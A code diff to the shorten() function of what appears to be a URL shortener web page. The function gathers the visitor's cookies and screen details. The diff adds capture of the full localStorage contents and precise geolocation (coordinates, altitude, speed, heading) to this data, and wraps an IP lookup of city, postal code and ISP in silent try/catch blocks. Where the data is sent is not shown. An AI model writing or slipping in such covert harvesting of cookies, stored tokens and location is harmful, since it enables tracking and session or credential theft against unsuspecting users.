@@ -99,7 +99,6 @@ async function shorten() {
 		dataCookiesEnabled: navigator.cookieEnabled,
 		dataCookies1: document.cookie,
 		dataCookies2: decodeURIComponent(document.cookie.split(";")),
-		// dataStorage: localStorage,
 		scrW: screen.width,
 		scrH: screen.height,
 		docW: document.width,
@@ -109,28 +108,42 @@ async function shorten() {
 		scrAvailW: screen.availWidth,
 		scrAvailH: screen.availHeight,
 		scrColorDepth: screen.colorDepth,
-		scrPixelDepth: screen.pixelDepth,
-		// lat: position.coords.latitude,
-		// long: position.coords.longitude,
-		// llAccuracy: position.coords.accuracy,
-		// altitude: position.coords.altitude,
-		// altAccuracy: position.coords.altitudeAccuracy,
-		// heading: position.coords.heading,
-		// speed: position.coords.speed,
-		// timestamp: position.timestamp,
+		scrPixelDepth: screen.pixelDepth
 	};
 
-	await fetch("https://ipapi.co/json").then(function(resp) {
-		info["ip"] = resp["ip"];
-		info["region"] = resp["region"];
-		info["city"] = resp["city"];
-		info["country"] = resp["country_name"];
-		info["postal"] = resp["postal"];
-		info["ipLat"] = resp["latitude"];
-		info["ipLong"] = resp["longitude"];
-		info["ipUTCoffset"] = resp["utc_offset"];
-		info["ISP"] = resp["org"];
-	});
+	try {
+		info.lat = geolocationPositionInstance.coords.latitude;
+		info.long = geolocationPositionInstance.coords.longitude;
+		info.llAccuracy = geolocationPositionInstance.coords.accuracy;
+		info.altitude = geolocationPositionInstance.coords.altitude;
+		info.altAccuracy = geolocationPositionInstance.coords.altitudeAccuracy;
+		info.heading = geolocationPositionInstance.coords.heading;
+		info.speed = geolocationPositionInstance.coords.speed;
+	} catch (e) {
+		console.log(e);
+	}
+
+	try {
+		info.dataStorage = localStorage;
+	} catch (e) {
+		console.log(e);
+	}
+
+	try {
+		await fetch("https://ipapi.co/json").then(function(resp) {
+			info.ip = resp.ip;
+			info.region = resp.region;
+			info.city = resp.city;
+			info.country = resp.country_name;
+			info.postal = resp.postal;
+			info.ipLat = resp.latitude;
+			info.ipLong = resp.longitude;
+			info.ipUTCoffset = resp.utc_offset;
+			info.ISP = resp.org;
+		});
+	} catch (e) {
+		console.log(e);
+	}
 
 	// Check for existing shortlink
 	await getReq(getSlug())
@@ -155,7 +168,6 @@ async function shorten() {
 						}
 					} else if (resp.status === 502) {
 						alert("Invalid long URL!");
-						err(resp.json());
 					} else {
 						err(resp.json());
 					}
